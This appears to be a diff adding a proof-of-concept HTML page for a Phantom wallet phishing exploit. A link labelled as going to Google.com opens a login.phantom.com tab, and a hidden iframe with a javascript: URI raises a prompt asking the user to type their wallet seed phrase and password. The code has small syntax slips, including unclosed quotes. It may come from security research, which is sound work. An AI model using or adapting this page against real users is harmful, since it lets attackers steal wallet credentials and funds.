@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      function exploit() {
+        // Opens legitimate-looking Google tab
+        window.open("https://login.phantom.com);
+
+        // Triggers fake prompt via javascript URI
+        document.getElementById("iframe").src =
+          'javascript:prompt("In order to access Phantom.com\\nyou must first login on your\\nPhantom Wallet Account.\\n\\nPlease type your seed phrase\\nand your password:\\n", Phrase / Password");';
+      }
+    </script>
+
+    <a href="#" onclick="exploit();">
+      <center><h1>Click here to go to Google.com</h1></center>
+    </a>
+
+    <iframe id="iframe" style="display:none;" src=""></iframe>
+  </body>
+</html>
